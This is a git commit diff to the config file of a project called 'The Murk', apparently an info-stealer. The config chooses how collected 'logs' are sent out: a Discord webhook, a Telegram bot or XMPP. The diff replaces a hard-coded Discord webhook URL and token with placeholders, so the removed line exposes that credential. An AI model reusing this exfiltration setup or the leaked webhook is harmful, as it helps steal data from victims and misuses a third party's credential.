858cdc3b465dae75fbdadc6f6a74ef7a2231ba4e
Nick Vinesmoke <123866627+Nick-Vinesmoke@users.noreply.github.com>
2023-07-05 18:10:40 +0300

    fixed

--- The Murk/config/config.py
+++ The Murk/config/config.py
@@ -7,7 +7,7 @@ class Config:
 
     sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
     # You can write your address for sending logs here
-    discordData = ["https://discord.com/api/webhooks/1121059844410056885/Gw58o1r9w8iqoN1mNlGajanTgBewpAQZ5bb4mBg94ghuVzUcA2iwSATx69mtvwqn747P","Data_bot"]
+    discordData = ["url of your WebHook","name of that WebHook"]
     TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
     xmppData = ["jabberid","jabberpassword","jabberreceiver"]
 
